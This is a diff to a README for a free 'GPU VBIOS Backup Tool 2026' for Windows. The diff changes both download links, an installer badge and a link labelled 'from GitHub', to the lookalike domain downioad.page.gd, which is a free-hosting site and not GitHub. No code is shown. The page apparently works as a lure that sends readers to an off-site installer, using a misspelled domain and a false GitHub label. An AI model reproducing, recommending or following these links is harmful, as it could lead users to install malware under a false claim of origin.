@@ -2,7 +2,7 @@
 
 GPU VBIOS Backup Tool 2026 is a free Windows desktop utility designed to help you easily save a backup copy of your graphics card's VBIOS (Video BIOS). This essential tool provides peace of mind by creating a recovery file you can use if your GPU's firmware becomes corrupted or needs to be restored.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside
 
@@ -48,7 +48,7 @@ A: Yes, the GPU VBIOS Backup Tool is completely free to download and use without
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
